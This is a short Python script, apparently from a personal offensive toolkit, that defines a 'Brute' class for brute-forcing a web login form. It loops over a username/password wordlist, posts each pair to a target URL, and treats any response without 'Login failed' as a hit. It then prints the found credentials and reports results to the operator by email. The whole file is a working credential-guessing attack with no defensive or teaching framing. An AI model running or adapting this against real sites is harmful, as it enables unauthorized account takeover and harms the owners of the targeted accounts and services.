#!/usr/bin/env python

import send_email
import requests

class Brute:
    def __init__(self, target_url, email, password):
        self.target_url = target_url
        self.email = email
        self.password = password



    def attack(self):
        data = {"username": "", "password": "", "Login": "submit"}
        with open("/root/PycharmProjects/tools/web_attacks/brute_force/username_password.txt", "r") as wordlist_file:
            for line in wordlist_file:
                username = line.strip()
                data["username"]=username
                with open("/root/PycharmProjects/tools/web_attacks/brute_force/username_password.txt", "r") as wordlist_file2:
                    for word in wordlist_file2:
                        password = word.strip()
                        data["password"]=password
                        response = requests.post(self.target_url, data=data)
                        if "Login failed" not in response.content:
                            # my_Email = send_email.Email(self.email, self.email, "Found Password","[+] Got the password --> Username: "+username+" Password: "+password+" URL: "+self.target_url, self.password)
                            # my_Email.address()
                            print("[+] Got the password --> Username:"+username+" Password:"+password)
                            exit()
        my_Email = send_email.Email(self.email, self.email,"No password found","Unable to find password to "+self.target_url ,self.password)
        my_Email.address()
        print("[+] Reached end of line")

